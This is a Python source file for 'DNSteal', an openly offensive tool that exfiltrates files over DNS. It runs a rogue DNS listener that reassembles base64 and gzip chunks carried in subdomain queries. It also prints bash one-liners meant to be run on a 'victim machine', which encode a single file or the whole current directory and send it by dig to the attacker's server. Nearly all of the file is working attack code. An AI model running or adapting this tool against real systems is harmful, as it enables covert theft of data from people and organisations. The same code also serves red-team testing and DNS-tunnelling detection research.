#!/usr/bin/env python

import socket
import urllib.request
import sys
import time
import hashlib
import zlib
import re
import base64

RED = "\033[1;31m"
RESET = "\033[0m"

VERSION = "3.0"


class DNSQuery:
    """ Represents a query sent to a DNS server """

    def __init__(self, data: bytes):
        """
        Args:
            data: The data returned from socket.recvfrom()
        """

        self.data = bytearray(data)
        self.data_text = b""

        tipo = (data[2] >> 3) & 15  # Opcode bits
        if tipo == 0:  # Standard query
            ini = 12
            lon = data[ini]
        while lon != 0:
            self.data_text += data[ini + 1 : ini + lon + 1] + b"."
            ini += lon + 1
            lon = data[ini]

        self.data_text = self.data_text.decode("utf-8")

    def request(self, ip_address: str) -> bytes:
        """Creates a DNS response packet to be sent back to the client

        Args:
            ip_address: An IPv4 Address i.e (192.168.2.1)

        Returns:
            Packet in bytes representing a DNS response message to be sent back
            to the client. https://en.wikipedia.org/wiki/Domain_Name_System#DNS_message_format
        """

        packet = b""
        if self.data_text:
            packet += self.data[:2] + b"\x81\x80"
            packet += (
                self.data[4:6] + self.data[4:6] + b"\x00\x00\x00\x00"
            )  # Questions and Answers Counts
            packet += self.data[12:]  # Original Domain Name Question
            packet += b"\xc0\x0c"  # Pointer to domain name
            packet += b"\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04"  # Response type, TTL, and resource data length -> 4 bytes
            packet += "".join(map(lambda x: chr(int(x)), ip_address.split("."))).encode(
                "utf-8"
            )  # Represent the IP address in 4 bytes
        return packet


def save_to_file(data_received: bytes, unzip=False, verbose=False):
    """Rebuild the data recieved sent by the client over DNS.

    Args:
        data_received (dict): Dictionary storing the names of exfiltrated file(s) as keys, and their contents in bytes as values
        unzip (bool): Whether or not the files have been sent zipped, and need to be unzipped.
        verbose (bool): Enables verbose logging
    """

    for key, value in data_received.items():
        file_seed = time.strftime("%Y-%m-%d_%H-%M-%S")
        fname = f"recieved_{file_seed}_{key}"
        flatdata = ""

        for block in value:
            flatdata += block[:-1].replace(
                "*", "+"
            )  # fix data (remove hyphens at end, replace * with + because of dig!)

        try:
            if verbose:
                print(f"[Info] base64 decoding data ({key.decode('utf-8')}).")
            flatdata = base64.b64decode(
                flatdata
            )  # test if padding correct by using a try/catch
        except (ValueError, TypeError):
            print(f"{RED}[Error]{RESET} Incorrect padding on base64 encoded data..")
            sys.exit(1)

        if unzip:
            if verbose:
                print(f"[Info] Unzipping data ({key}).")

            try:
                x = zlib.decompressobj(16 + zlib.MAX_WBITS)
                flatdata = x.decompress(flatdata)
            except zlib.error:
                print(
                    f"{RED}[Error]{RESET} Could not unzip data, did you specify the -z switch ?"
                )
                sys.exit(1)

            print(f"[Info] Saving recieved bytes to './{fname}'")

            try:
                with open(fname, "wb") as f:
                    f.write(flatdata)
            except IOError:
                print(f"{RED}[Error]{RESET} Opening file {fname} to save data.")
                sys.exit(1)

        else:
            print(f"[Info] Saving bytes to './{fname}'")

            try:
                with open(fname, "wb") as f:
                    f.write(flatdata)
            except IOError:
                print(f"{RED}[Error]{RESET} Opening file {fname} to save data.")
                sys.exit(1)

        with open(fname, "r") as f:
            md5sum = hashlib.md5(f.read().encode("utf-8")).hexdigest()
            print(f"[md5sum] {md5sum}")


def usage(message=""):
    """ Displays usage information and description of command-line flags """

    banner()
    print(f"Usage: python {sys.argv[0]} [listen_address] [options]")
    print("\nOptions:")
    print("-z\tUnzip incoming files.")
    print("-v\tVerbose output.")
    print("-h\tThis help menu")
    print("\n")
    print("Advanced:")
    print("-b\tBytes to send per subdomain                 (default = 57, max=63)")
    print(
        "-s\tNumber of data subdomains per request       (default =  4, ie. $data.$data.$data.$data.$filename)"
    )
    print("-f\tLength reserved for filename per request    (default = 17)")
    print("\n")
    print(f"$ python {sys.argv[0]} -z 127.0.0.1")
    print("\n")
    print(
        f"{RED}-------- Do not change the parameters unless you understand! --------{RESET}"
    )
    print("\n")
    print("The query length cannot exceed 253 bytes. This is including the filename.")
    print("The subdomains lengths cannot exceed 63 bytes.")
    print("\n")
    print("Advanced: ")
    print(
        f"{sys.argv[0]} 127.0.0.1 -z -s 4 -b 57 -f 17\t4 subdomains, 57 bytes => (57 * 4 = 232 bytes) + (4 * '.' = 236). Filename => 17 byte(s)"
    )
    print(
        f"{sys.argv[0]} 127.0.0.1 -z -s 4 -b 55 -f 29\t4 subdomains, 55 bytes => (55 * 4 = 220 bytes) + (4 * '.' = 224). Filename => 29 byte(s)"
    )
    print(
        f"{sys.argv[0]} 127.0.0.1 -z -s 4 -b 63 -f  1\t4 subdomains, 63 bytes => (62 * 4 = 248 bytes) + (4 * '.' = 252). Filename =>  1 byte(s)"
    )
    print("\n")


def print_client_commands(subdomains, bytes_per_subdomain, ip_address, zip):
    """Prints out shell commands that can be run on the client in order to faciliate exfiltration on the client-side

    Args:
        subdomains (int): The number of subdomains to use per request
        bytes_per_subdomain (int): The number of bytes per subdomain
        ip_address (str): IPv4 address
        zip (bool): Whether or not to zip the contents before sending

    """

    print("[+] On the victim machine, use any of the following commands:")
    print("[+] Remember to set filename for individual file transfer.")
    print("\n")

    if zip:
        print("[?] Copy an individual file, i.e file.txt (ZIP enabled)")
        print(
            f"""{RED}\x23{RESET} f=file.txt; s={subdomains};b={bytes_per_subdomain};c=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\\{{$b\\}}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @{ip_address} `echo -ne $r$f|tr "+" "*"` +short; done\n"""
        )
        print("[?] Copy the clients entire current directory (ZIP enabled)")
        print(
            f"""{RED}\x23{RESET} for f in $(ls .); do s={subdomains};b={bytes_per_subdomain};c=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\\{{$b\\}}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @{ip_address} `echo -ne $r$f|tr "+" "*"` +short; done ; done\n"""
        )
    else:
        print("[?] Copy an individual file, i.e file.txt")
        print(
            f"""{RED}\x23{RESET} f=file.txt; s={subdomains};b={bytes_per_subdomain};c=0; for r in $(for i in $(base64 -w0 $f| sed "s/.\\{{$b\\}}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @{ip_address} `echo -ne $r$f|tr "+" "*"` +short; done\n"""
        )
        print("[?] Copy the clients current directory")
        print(
            f"""{RED}\x23{RESET} for f in $(ls .); do s={subdomains};b={bytes_per_subdomain};c=0; for r in $(for i in $(base64 -w0 $f | sed "s/.\\{{$b\\}}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @{ip_address} `echo -ne $r$f|tr "+" "*"` +short; done ; done\n"""
        )


def banner():

    print(
        f"""{RED}
     ___  _  _ ___ _            _
    |   \\| \\| / __| |_ ___ __ _| |
    | |) | .` \\__ \\  _/ -_) _` | |
    |___/|_|\\_|___/\\__\\___\\__,_|_|v{VERSION}
    -- https://github.com/ranguli/dnsteal.git --

    File exfiltration via DNS requests
        {RESET}"""
    )


if __name__ == "__main__":

    zip_files = False
    subdomains = 4
    bytes_per_subdomain = 57
    filename_length = 17
    verbose = False
    regx_ip = "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"

    if "-h" in sys.argv or len(sys.argv) < 2:
        usage()
        sys.exit(1)

    ip_address = sys.argv[1]
    port = 53

    if len(sys.argv) > 2:
        try:
            port = int(sys.argv[2])
        except (TypeError, ValueError):
            usage(f"{RED}[Error]{RESET} Port argument must be an integer.")
            sys.exit(1)

    if re.match(regx_ip, ip_address) is None:
        usage("{RED}[Error]{RESET} First argument must be listen address.")
        sys.exit(1)

    if "-z" in sys.argv:
        zip_files = True
    if "-s" in sys.argv:
        subdomains = int(sys.argv[sys.argv.index("-s") + 1])
    if "-b" in sys.argv:
        bytes_per_subdomain = int(sys.argv[sys.argv.index("-b") + 1])
    if "-f" in sys.argv:
        filename_length = int(sys.argv[sys.argv.index("-f") + 1])
    if "-v" in sys.argv:
        verbose = True

    if (
        (bytes_per_subdomain > 63)
        or ((bytes_per_subdomain * subdomains) > 253)
        or (((bytes_per_subdomain * subdomains) + filename_length) > 253)
    ):
        usage("{RED}[Error]{RESET} Entire query cannot be > 253. Read help (-h)")

    banner()

    udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    try:
        udp.bind((ip_address, port))
    except socket.error:
        print(f"{RED}[Error]{RESET} Cannot bind to address {ip_address}:{port}")
        sys.exit(1)

    print(f"[+] DNS listening on {ip_address}:{port}")
    external_ip = urllib.request.urlopen("https://ifconfig.me").read().decode("utf-8")
    print_client_commands(subdomains, bytes_per_subdomain, external_ip, zip_files)
    print("[+] Once files have sent, use Ctrl+C to exit and save.\n")

    try:
        data_received = {}
        while True:
            # There is a bottle neck in this function, if very slow PC, will take
            # slightly longer to send as this main loop recieves the data from victim.

            # Listen for requests from the client
            data, addr = udp.recvfrom(1024)
            # Create a DNS response to send to the client
            p = DNSQuery(data)
            # Send back a response
            udp.sendto(p.request(ip_address), addr)

            req_split = p.data_text.split(".")
            req_split.pop()  # fix trailing dot... cba to fix this

            dlen = len(req_split)
            fname = ""
            tmp_data = []

            for n in range(0, dlen):
                if req_split[n][len(req_split[n]) - 1] == "-":
                    tmp_data.append(req_split[n])
                else:
                    # Filename
                    fname += req_split[n] + "."

            fname = fname[:-1]

            if fname not in data_received:
                data_received[fname] = []

            print(f"[>] len: '{len(p.data_text)} bytes'\t- {fname}")
            if verbose:
                print(f"[>>] {p.data_text} -> {ip_address} :{port}")

            for d in tmp_data:
                data_received[fname].append(d)

    except KeyboardInterrupt:
        save_to_file(data_received, zip, verbose)
        print(f"\n{RED}[!]{RESET} Closing...")
        udp.close()
